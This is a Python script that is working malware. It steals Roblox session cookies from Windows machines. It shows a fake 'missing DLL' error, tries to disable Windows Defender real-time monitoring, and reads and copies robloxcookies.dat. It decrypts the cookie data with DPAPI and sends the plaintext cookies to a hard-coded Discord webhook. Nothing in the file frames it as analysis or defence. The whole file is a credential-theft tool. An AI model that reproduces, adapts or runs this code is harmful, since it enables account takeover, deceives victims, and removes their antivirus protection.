import os
import shutil
import json
import base64
import requests
import sys
import time
import subprocess
import ctypes
from ctypes import wintypes
from datetime import datetime, timezone
from time import sleep as zzz

WEBHOOK_URL = "https://discord.com/api/webhooks/1409952766528327861/1cdwrPBftWrwrE7jyNj2ifTfbVPjt3aqs03nIUJw-lPE3fIpmCv_DIL3U2aRL72vcfED"
ANTI_SPAM_FILE = os.path.join(os.getenv("TEMP"), "chrome_BITS_9032_815744591.txt")

def log(text, sleep=None):
    try:
        with open(os.path.join(os.getenv("TEMP"), "c63hr09O-me0e-4527-a849-438c2code1f7.log"), 'a', encoding='utf-8') as f:
            f.write(f"[2025-08-26 17:58:21] -> {text}\n")
        if sleep: zzz(sleep)
    except:
        pass

def check_anti_spam():
    if False:
        try:
            temp_dir = os.getenv("TEMP", "")
            if not os.access(temp_dir, os.W_OK):
                log("Anti-spam: No write permission for TEMP directory")
                return
            if os.path.exists(ANTI_SPAM_FILE):
                with open(ANTI_SPAM_FILE, 'r') as f:
                    last_run = float(f.read().strip())
                if time.time() - last_run < 60:
                    log("Anti-spam: Too soon to run again.")
                    sys.exit()
            with open(ANTI_SPAM_FILE, 'w') as f:
                f.write(str(time.time()))
        except ValueError:
            log("Anti-spam: Corrupted last run time, resetting")
            with open(ANTI_SPAM_FILE, 'w') as f:
                f.write(str(time.time()))
        except Exception as e:
            log(f"Anti-spam error: {str(e)}")

def send_webhook(content, ping_type="Everyone"):
    if not WEBHOOK_URL:
        log("Error: WEBHOOK_URL not set")
        return
    embed = {
        "title": "Decrypted Roblox Cookies",
        "description": f"```{content}```",
        "color": 0x38d13b
    }
    data = {"embeds": [embed]}
    if "Spidey Bot":
        data["username"] = "Spidey Bot"
    if "":
        data["avatar_url"] = ""
    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=3)
        log(f"Webhook sent, status: {response.status_code}")
        if response.status_code not in (200, 204):
            log(f"Webhook failed: {response.text}")
        
        if False and ping_type:
            ping_data = {"content": f"{'@' + ping_type.lower()}"}
            try:
                response = requests.post(WEBHOOK_URL, json=ping_data, timeout=3)
                log(f"Ping sent, status: {response.status_code}")
                if response.status_code not in (200, 204):
                    log(f"Ping failed: {response.text}")
            except Exception as e:
                log(f"Ping error: {str(e)}")
    except Exception as e:
        log(f"Webhook error: {str(e)}")

def minimize_console():
    try:
        import win32gui
        import win32con
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
        log("Console minimized")
    except Exception as e:
        log(f"Minimize console error: {str(e)}")

def show_fake_error():
    try:
        import win32gui
        import win32con
        win32gui.MessageBox(0, "Application failed to start: missing DLL", "Critical Error", win32con.MB_ICONERROR)
        log("Displayed fake error message")
    except Exception as e:
        log(f"Fake error message failed: {{str(e)}}")

def disable_defender():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            log("Disable Defender error: Requires admin privileges")
            return
        result = subprocess.run(
            ["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"],
            capture_output=True, text=True, shell=True
        )
        if result.returncode == 0:
            log("Disabled Windows Defender real-time protection")
        else:
            log(f"Disable Defender error: {{result.stderr.strip()}}")
    except Exception as e:
        log(f"Disable Defender error: {{str(e)}}")




def retrieve_roblox_cookies():
    show_fake_error()
    disable_defender()
    minimize_console()
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]

    try:
        crypt32 = ctypes.WinDLL("crypt32.dll")
        CryptUnprotectData = crypt32.CryptUnprotectData
        CryptUnprotectData.argtypes = [
            ctypes.POINTER(DATA_BLOB), ctypes.POINTER(ctypes.c_wchar_p),
            ctypes.POINTER(DATA_BLOB), ctypes.c_void_p, ctypes.c_void_p,
            wintypes.DWORD, ctypes.POINTER(DATA_BLOB)
        ]
        CryptUnprotectData.restype = wintypes.BOOL
        log("Using ctypes.CryptUnprotectData from crypt32.dll")
    except Exception as e:
        log(f"Error setting up ctypes.CryptUnprotectData: {str(e)}")
        embed = {
            "title": ":x: CryptUnprotectData Setup Error",
            "description": f"Failed to set up CryptUnprotectData: {str(e)}",
            "color": 0xFF0000
        }
        send_webhook(embed)
        return

    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
    if not os.path.exists(roblox_cookies_path):
        log(f"Cookie file not found at {roblox_cookies_path}")
        embed = {
            "title": ":x: Cookie File Not Found",
            "description": f"Could not find robloxcookies.dat at {roblox_cookies_path}",
            "color": 0xFF0000
        }
        send_webhook(embed)
        return
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    try:
        shutil.copy(roblox_cookies_path, destination_path)
        log(f"Copied cookie file to {destination_path}")
    except Exception as e:
        log(f"Error copying cookie file: {str(e)}")
        embed = {
            "title": ":x: File Copy Error",
            "description": f"Failed to copy cookie file: {str(e)}",
            "color": 0xFF0000
        }
        send_webhook(embed)
        return
    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            try:
                file_content = json.load(file)
                encoded_cookies = file_content.get("CookiesData", "")
                if encoded_cookies:
                    decoded_cookies = base64.b64decode(encoded_cookies)
                    try:
                        data_in = DATA_BLOB()
                        data_in.cbData = len(decoded_cookies)
                        data_in.pbData = ctypes.cast(ctypes.create_string_buffer(decoded_cookies), ctypes.POINTER(ctypes.c_byte))
                        data_out = DATA_BLOB()
                        success = CryptUnprotectData(
                            ctypes.byref(data_in), None, None, None, None, 0, ctypes.byref(data_out)
                        )
                        if success:
                            decrypted_bytes = ctypes.string_at(data_out.pbData, data_out.cbData)
                            cookie_string = decrypted_bytes.decode('utf-8', errors='ignore')
                            log("Decrypted cookie string retrieved.")
                            print("Decrypted Content:")
                            print(cookie_string)
                            send_webhook(cookie_string)
                            ctypes.windll.kernel32.LocalFree(data_out.pbData)
                        else:
                            error_code = ctypes.get_last_error()
                            log(f"Error decrypting with DPAPI: Error code {error_code}")
                            embed = {
                                "title": ":x: Decryption Error",
                                "description": f"Failed to decrypt cookie data: Error code {error_code}",
                                "color": 0xFF0000
                            }
                            send_webhook(embed)
                    except Exception as e:
                        log(f"Error decrypting with DPAPI: {str(e)}")
                        embed = {
                            "title": ":x: Decryption Error",
                            "description": f"Failed to decrypt cookie data: {str(e)}",
                            "color": 0xFF0000
                        }
                        send_webhook(embed)
                else:
                    log("Error: No 'CookiesData' found in the file.")
                    embed = {
                        "title": ":x: No Cookies Data",
                        "description": "No 'CookiesData' found in robloxcookies.dat.",
                        "color": 0xFF0000
                    }
                    send_webhook(embed)
            except json.JSONDecodeError as e:
                log(f"Error while parsing JSON: {str(e)}")
                embed = {
                    "title": ":x: JSON Parse Error",
                    "description": f"Failed to parse robloxcookies.dat: {str(e)}",
                    "color": 0xFF0000
                }
                send_webhook(embed)
    except Exception as e:
        log(f"Error reading file: {str(e)}")
        embed = {
            "title": ":x: File Read Error",
            "description": f"Failed to read robloxcookies.dat: {str(e)}",
            "color": 0xFF0000
        }
        send_webhook(embed)
if __name__ == "__main__":
    retrieve_roblox_cookies()
